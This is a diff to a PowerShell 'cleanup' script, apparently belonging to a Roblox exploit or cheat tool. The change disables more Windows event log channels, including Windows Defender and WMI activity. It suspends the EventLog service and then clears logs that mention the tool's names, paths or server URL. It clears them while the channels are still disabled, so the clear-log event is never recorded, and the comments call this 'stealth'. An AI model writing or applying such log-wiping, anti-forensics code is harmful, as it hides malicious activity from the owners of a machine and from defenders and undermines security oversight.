@@ -382,16 +382,24 @@ function Run-CleanupStep {
     Write-Host ""
 }
 
-# Temporarily disable event logging during cleanup to maintain stealth
-$suspendedLogPid = Suspend-EventLogService
+# Temporarily disable event logging channels during cleanup to maintain stealth
 $tempDisabledChannels = @(
     "Microsoft-Windows-PowerShell/Operational",
     "Microsoft-Windows-TaskScheduler/Operational",
-    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
+    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+    "Microsoft-Windows-Windows Defender/Operational",
+    "Microsoft-Windows-Windows Defender/WHC",
+    "Microsoft-Windows-Application-Experience/Program-Telemetry",
+    "Microsoft-Windows-Application-Experience/Program-Inventory",
+    "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant",
+    "Microsoft-Windows-WMI-Activity/Operational"
 )
 foreach ($chan in $tempDisabledChannels) {
     try { wevtutil.exe sl $chan /e:false 2>$null } catch {}
 }
+
+# Now suspend the EventLog service to prevent logging of cleanup actions
+$suspendedLogPid = Suspend-EventLogService
 
 try {
     # 1. Terminate running processes
@@ -923,28 +931,73 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
 }
 
 } finally {
-    # 9. Restore Event Log Settings & Service
-    Run-CleanupStep "9/9: Restoring Event Log Channels & Service" {
-        # Re-enable event log channels disabled by setup/installer or temporarily
-        $channelsToEnable = @(
+    # 9. Clear Trace Logs & Restore Event Log Service
+    Run-CleanupStep "9/9: Clearing Trace Logs & Restoring Event Log Channels & Service" {
+        # 9a. Resume the EventLog service first, so we can communicate with it to clear logs
+        if ($suspendedLogPid) {
+            Resume-EventLogService -ProcessId $suspendedLogPid
+        }
+
+        # 9b. Clear the specific operational event logs while their channels are still disabled.
+        # Since the channels are disabled, the EventLog service will not write a "clear log" event (Event 104) to them.
+        $targetLogs = @(
             "Microsoft-Windows-PowerShell/Operational", 
             "Microsoft-Windows-TaskScheduler/Operational",
-            "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
+            "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+            "Microsoft-Windows-Windows Defender/Operational",
+            "Microsoft-Windows-Windows Defender/WHC",
+            "Microsoft-Windows-Application-Experience/Program-Telemetry",
+            "Microsoft-Windows-Application-Experience/Program-Inventory",
+            "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant",
+            "Microsoft-Windows-WMI-Activity/Operational"
         )
+        
+        $wipedCount = 0
+        $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
+        foreach ($log in $targetLogs) {
+            try {
+                # Smart check: only clear log if it actually contains traces
+                $hasTraces = $false
+                $events = Get-WinEvent -FilterHashtable @{LogName=$log} -MaxEvents 500 -ErrorAction SilentlyContinue
+                if ($events) {
+                    $searchTerms = @("lowlife", "RobloxCrashHandler", "delta", "B332FDC6")
+                    if ($scriptRoot) { $searchTerms += $scriptRoot }
+                    if ($storedWorkspace) { $searchTerms += $storedWorkspace }
+                    if ($storedServerUrl) { $searchTerms += $storedServerUrl }
+
+                    foreach ($ev in $events) {
+                        $msg = $ev.Message
+                        if ($msg) {
+                            foreach ($term in $searchTerms) {
+                                if ($msg.IndexOf($term, [System.StringComparison]::OrdinalIgnoreCase) -ge 0) {
+                                    $hasTraces = $true
+                                    break
+                                }
+                            }
+                        }
+                        if ($hasTraces) { break }
+                    }
+                }
+                if ($hasTraces) {
+                    $session.ClearLog($log)
+                    $wipedCount++
+                }
+            } catch {
+                # Log might be empty or locked, skip gracefully
+            }
+        }
+        $script:totalCleanedLogs += $wipedCount
+
+        # 9c. Re-enable event log channels now that they are clean
         $restoredCount = 0
-        foreach ($chan in $channelsToEnable) {
+        foreach ($chan in $targetLogs) {
             try {
                 wevtutil.exe sl $chan /e:true 2>$null
                 $restoredCount++
             } catch {}
         }
         
-        # Resume the EventLog service
-        if ($suspendedLogPid) {
-            Resume-EventLogService -ProcessId $suspendedLogPid
-        }
-        
-        return "Restored $restoredCount event log channel(s) and resumed EventLog service"
+        return "Stealth cleared $wipedCount operational trace log(s) and restored $restoredCount event log channel(s)"
     }
 }
 
